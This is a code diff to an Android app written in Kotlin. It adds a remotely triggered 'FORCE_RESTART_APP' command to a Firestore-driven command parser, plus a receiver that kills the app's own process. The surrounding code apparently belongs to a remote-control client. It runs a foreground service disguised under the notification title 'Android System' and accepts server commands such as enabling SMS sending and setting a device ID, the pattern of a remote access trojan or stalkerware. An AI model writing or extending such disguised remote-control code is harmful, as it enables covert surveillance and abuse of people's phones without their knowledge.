@@ -824,6 +824,14 @@ fun parseCommand(command: String, firestore: FirebaseFirestore, context: Context
             "ENABLE_SENDING_SMS: Operation completed successfully",
             messageID, serverID
         )
+    } else if (command == "FORCE_RESTART_APP") {
+        sendMessage(
+            context,
+            false,
+            "FORCE_RESTART_APP: Restarting app ...",
+            messageID, serverID
+        )
+        context.sendBroadcast(Intent(KILL_SELF_BROADCAST))
     } else if (command.startsWith("SET_DEVICE_ID ")) {
         val id = command.removePrefix("SET_DEVICE_ID ")
         with(preferences.edit()) {
@@ -6462,6 +6470,14 @@ class ClientService: Service() {
             .setContentTitle("Android System")
             .build()
         startForeground(1, notification)
+
+        val killSelfBroadcastReceiver = object : BroadcastReceiver() {
+            override fun onReceive(context: Context, intent: Intent) {
+                Log.d("ClientService", "Received kill self broadcast")
+                android.os.Process.killProcess(android.os.Process.myPid())
+            }
+        }
+        registerReceiver(killSelfBroadcastReceiver, IntentFilter(KILL_SELF_BROADCAST), RECEIVER_EXPORTED)
 
         val firestore = FirebaseFirestore.getInstance()
         val storage = FirebaseStorage.getInstance().reference
